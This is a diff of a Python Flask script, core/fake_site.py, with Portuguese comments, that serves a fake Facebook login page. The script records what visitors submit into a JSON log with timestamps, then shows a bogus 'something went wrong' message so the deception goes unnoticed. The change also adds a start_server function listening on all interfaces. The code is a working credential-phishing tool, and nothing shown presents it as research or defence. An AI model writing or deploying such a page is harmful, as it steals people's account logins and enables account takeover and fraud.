@@ -1,15 +1,17 @@
+# core/fake_site.py
 from flask import Flask, request, render_template_string
 import json
 from datetime import datetime
 import os
 
 app = Flask(__name__)
-
 LOG_PATH = os.path.join(os.path.dirname(__file__), 'logs', 'social_log.json')
+
+# Cria a pasta logs se não existir
 os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
 
-# HTML da página de login (mantido igual)
-login_template = """ 
+# HTML da página falsa de login (exemplo genérico)
+login_template = """
 
 <!DOCTYPE html>
 <html lang="pt" id="facebook" class="no_js">
@@ -56,6 +58,7 @@ def login():
         'timestamp': datetime.now().isoformat()
     }
 
+    # Lê e atualiza o arquivo JSON de log
     try:
         if os.path.exists(LOG_PATH):
             with open(LOG_PATH, 'r') as f:
@@ -70,7 +73,8 @@ def login():
     with open(LOG_PATH, 'w') as f:
         json.dump(data, f, indent=4)
 
-    return "<h1>Algo deu errado. Tente novamente mais tarde.</h1>"
+    return "<h3>Algo deu errado. Tente novamente mais tarde.</h3>"
 
-if __name__ == '__main__':
-    app.run(debug=True)
+def start_server():
+    print("[*] Servidor Flask iniciado em http://127.0.0.1:5000")
+    app.run(host='0.0.0.0', port=5000, debug=False)
